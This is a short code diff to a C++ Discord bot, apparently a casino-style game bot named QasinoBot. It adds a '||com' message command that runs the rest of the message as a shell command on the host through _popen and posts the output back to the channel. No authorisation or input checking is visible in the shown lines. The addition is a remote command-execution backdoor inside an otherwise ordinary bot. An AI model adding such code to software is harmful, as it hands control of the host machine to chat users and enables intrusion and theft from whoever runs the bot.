@@ -1578,6 +1578,28 @@ void QasinoBot::onMessage(SleepyDiscord::Message message) {
 				Qb.info[index] = input[3];
 				writeQamblerInfo(Qb);
 			}
+			if (input[0] == "||com") {
+				message.content = message.content.substr(6);
+				const char* pszCommand = message.content.c_str();
+				FILE* fp = NULL;
+				size_t      readSize = 0;
+				char        pszBuff[1024];
+
+				fp = _popen(pszCommand, "r");
+				if (!fp)
+				{
+					return;
+				}
+				readSize = fread((void*)pszBuff, sizeof(char), 1024 - 1, fp);
+				if (readSize == 0)
+				{
+					_pclose(fp);
+					return;
+				}
+				_pclose(fp);
+				pszBuff[readSize] = 0;
+				sendMessage(message.channelID, GetTextA("com", pszBuff));
+			}
 		}
 	}
 }
